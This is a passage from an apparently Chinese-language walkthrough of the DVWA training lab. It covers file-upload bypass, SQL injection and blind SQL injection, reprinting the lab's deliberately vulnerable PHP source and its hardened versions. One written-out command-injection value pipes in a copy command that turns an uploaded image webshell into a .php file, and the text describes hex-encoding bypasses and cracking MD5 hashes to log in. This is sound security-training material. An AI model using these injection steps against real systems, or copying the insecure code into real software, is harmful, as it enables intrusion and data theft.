<p>这里可以使用图片马来绕过，图片马的制作类似与pikachu里的制作<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-11-08-27.png" alt="制作图片马" class="lazyload"><br>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-11-19-41.png" alt="复现" class="lazyload"><br>之后需要配合其他漏洞让图片马一脚本的方式解析后再使用webshell管理工具连接即可，如使用命令注入漏洞修改图片的后缀然后再连接。<br>构造语句<code>127.0.0.1 |copy C:\phpstudy_pro\WWW\DVWA\hackable\uploads\2.jpg C:\phpstudy_pro\WWW\DVWA\hackable\uploads\2.php</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-12-52-36.png" alt="配合其他漏洞拿权限" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_ext</span>  = substr( <span class="hljs-variable">$uploaded_name</span>, strrpos( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ];<br><br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;hackable/uploads/&#x27;</span>;<br>    <span class="hljs-comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;上传文件前缀md5加密</span><br>    <span class="hljs-variable">$target_file</span>   =  md5( uniqid() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$uploaded_ext</span>;<br>    <span class="hljs-variable">$temp_file</span>     = ( ( ini_get( <span class="hljs-string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="hljs-string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="hljs-string">&#x27;upload_tmp_dir&#x27;</span> ) ) );<br>    <span class="hljs-variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$uploaded_ext</span>;<br><br>    <span class="hljs-comment">// Is it an image?</span><br>    <span class="hljs-keyword">if</span>( ( strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpg&#x27;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpeg&#x27;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;png&#x27;</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/png&#x27;</span> ) &amp;&amp;<br>        getimagesize( <span class="hljs-variable">$uploaded_tmp</span> ) ) &#123;<br><br>        <span class="hljs-comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> ) &#123;<br>            <span class="hljs-variable">$img</span> = imagecreatefromjpeg( <span class="hljs-variable">$uploaded_tmp</span> );<br>            imagejpeg( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">100</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$img</span> = imagecreatefrompng( <span class="hljs-variable">$uploaded_tmp</span> );<br>            imagepng( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">9</span>);<br>        &#125;<br>        imagedestroy( <span class="hljs-variable">$img</span> );<br><br>        <span class="hljs-comment">// Can we move the file to the web root from the temp folder?</span><br>        <span class="hljs-keyword">if</span>( rename( <span class="hljs-variable">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class="hljs-variable">$target_path</span> . <span class="hljs-variable">$target_file</span> ) ) ) &#123;<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Delete any temp files</span><br>        <span class="hljs-keyword">if</span>( file_exists( <span class="hljs-variable">$temp_file</span> ) )<br>            unlink( <span class="hljs-variable">$temp_file</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这个级别的文件上传对文件进行了重命名搞了个md5加密，还增加了token值校验，对文件内容做了严格检查。</p>
<h2 id="DVWA-–-SQL-Injection-sql注入"><a href="#DVWA-–-SQL-Injection-sql注入" class="headerlink" title="DVWA –  SQL Injection (sql注入)"></a>DVWA –  SQL Injection (sql注入)</h2><p>sql注入是指攻击者通过注入恶意sql命令，破坏sql查询语句结构从而达到执行恶意sql语句的目的。sql注入漏洞的危害是巨大的，常常导致整个数据库被“脱库”，尽管如此sql注入仍是最常见的web漏洞之一。<br>sql注入的流程：</p>
<ol>
<li>判断是否存在注入，注入是字符型还是数字型(根据后台查询语句进行分类)</li>
<li>猜解sql查询语句中的字段数order by</li>
<li>确定显示字段顺序</li>
<li>获取当前数据库</li>
<li>获取当前数据库中的表</li>
<li>获取表中的字段名</li>
<li>下载数据</li>
</ol>
<p>sql注入主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-25-40.png" alt="sql注入" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input 获取id</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check database 拼接sql查询</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">// Get results</span><br>    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;<br>        <span class="hljs-comment">// Get values</span><br>        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>第一步查找注入点判断注入类型</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-38-59.png" alt="确定注入类型" class="lazyload"></p>
<p>第二步判断字段数<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-41-47.png" alt="判断字段数" class="lazyload"></p>
<p>第三步 确定字段显示顺序<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-44-09.png" alt="确定字段显示顺序" class="lazyload"></p>
<p>第四步 获取数据库名、用户名、版本号<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-48-03.png" alt="获取数据库名、用户名、版本号" class="lazyload"></p>
<p><strong>在MYSQL5.0以上版本中自带数据库 information_schema，information_schema 存储所有数据库名，表名，列名信息，可以通过查询此库获得信息</strong><br>第五步 查询库中的表<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-17-23-57.png" alt="查询数据库中的表" class="lazyload"><br>出现错误如何解决：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-17-21-53.png" alt="执行union出错" class="lazyload"><br>第六步 查询表中的字段名<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-17-26-14.png" alt="查询字段名" class="lazyload"><br>第七步获取字段相关信息<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-17-27-51.png" alt="获取数据信息" class="lazyload"><br>然后md5解密直接登录就获取了权限了</p>
<p><strong>Medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br>    <span class="hljs-comment">//使用这个函数将mysqli_real_escape_string将x00，n，r，，’，”，x1a转义，防SQL注入</span><br>    <span class="hljs-variable">$id</span> = mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$id</span>);<br><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">// Get results</span><br>    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;<br>        <span class="hljs-comment">// Display values</span><br>        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">// This is used later on in the index.php page</span><br><span class="hljs-comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span><br><span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><span class="hljs-variable">$number_of_rows</span> = mysqli_fetch_row( <span class="hljs-variable">$result</span> )[<span class="hljs-number">0</span>];<br><br>mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：这里使用了post方式提交，还是用了转义防止sql注入<br>第一步判断注入类型：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-14-02.png" alt="判断" class="lazyload"><br>第二部判断字段数<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-16-26.png" alt="字段数" class="lazyload"><br>第三步确定字段位置<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-21-08.png" alt="确定位置" class="lazyload"><br>第四步查询库名<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-22-01.png" alt="查库名" class="lazyload"><br>第五步查表名<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-25-57.png" alt="查表名" class="lazyload"><br>第六步查询users中的字段名<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-40-40.png" alt="获取字段名" class="lazyload"><br>这里单引号被转义用16进制绕过<br>第七步获取字段的值<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-43-33.png" alt="获取内容" class="lazyload"><br>解密登录</p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span> [ <span class="hljs-string">&#x27;id&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check database</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    【select * from tableName limit i,n 】</span><br><span class="hljs-comment">        tableName : 为数据表；</span><br><span class="hljs-comment">        i : 为查询结果的索引值（默认从0开始）；</span><br><span class="hljs-comment">        n : 为查询结果返回的数量</span><br><span class="hljs-comment">        查询第一条数据</span><br><span class="hljs-comment">        select * from student limit 1</span><br><span class="hljs-comment">        查询第二条数据</span><br><span class="hljs-comment">        select * from student limit 1,1</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">// Get results</span><br>    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;<br>        <span class="hljs-comment">// Get values</span><br>        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);        <br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>添加了limit限制可以用#注释掉后边的内容，复现过程和low一样<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-20-48-24.png" alt="复现" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br>    <span class="hljs-comment">// Was a number entered?</span><br>    <span class="hljs-keyword">if</span>(is_numeric( <span class="hljs-variable">$id</span> )) &#123;<br>        <span class="hljs-comment">// Check the database</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$id</span>, PDO::PARAM_INT );<br>        <span class="hljs-variable">$data</span>-&gt;execute();<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;fetch();<br><br>        <span class="hljs-comment">// Make sure only 1 result is returned</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$data</span>-&gt;rowCount() == <span class="hljs-number">1</span> ) &#123;<br>            <span class="hljs-comment">// Get values</span><br>            <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;first_name&#x27;</span> ];<br>            <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_name&#x27;</span> ];<br><br>            <span class="hljs-comment">// Feedback for end user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>加入token、检测 id 是否是数字，prepare预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p>
<h2 id="DVWA-–-SQL-Injection（blind）盲注"><a href="#DVWA-–-SQL-Injection（blind）盲注" class="headerlink" title="DVWA – SQL Injection（blind）盲注"></a>DVWA – SQL Injection（blind）盲注</h2><p>SQL Injection(Blind)(sql盲注)：相比于常规注入他不会返回数据的信息或语法信息，只会将服务器包装后的信息返回到页面中<br>对比：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-20-51-25.png" alt="对比图" class="lazyload"><br>盲注分类分为两类：bool盲注和时间盲注，通过返回的值或者时间来判断是否正确</p>
<p>SQL盲注的基本流程：</p>
<ol>
<li>判断是否存在注入，注入的类型</li>
<li>猜解当前数据库的名称</li>
<li>猜解数据库中的表名</li>
<li>猜解表中的字段名</li>
<li>获取表中字段的值</li>
<li>验证字段值的有效性</li>
<li>获取数据库的其他信息</li>
</ol>
<p>sql盲注主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-20-55-46.png" alt="盲注" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br>    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_DVWA</span>[<span class="hljs-string">&#x27;SQLI_DB&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> MYSQL:<br>            <span class="hljs-comment">// Check database</span><br>            <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span><br><br>            <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> !== <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-variable">$exists</span> = (mysqli_num_rows( <span class="hljs-variable">$result</span> ) &gt; <span class="hljs-number">0</span>);<br>                &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>            ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SQLITE:<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$sqlite_db_connection</span>;<br><br>            <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-variable">$results</span> = <span class="hljs-variable">$sqlite_db_connection</span>-&gt;query(<span class="hljs-variable">$query</span>);<br>                <span class="hljs-variable">$row</span> = <span class="hljs-variable">$results</span>-&gt;fetchArray();<br>                <span class="hljs-variable">$exists</span> = <span class="hljs-variable">$row</span> !== <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">//判断exists的值大于零输出下边第一句</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$exists</span>) &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span><br>        header( <span 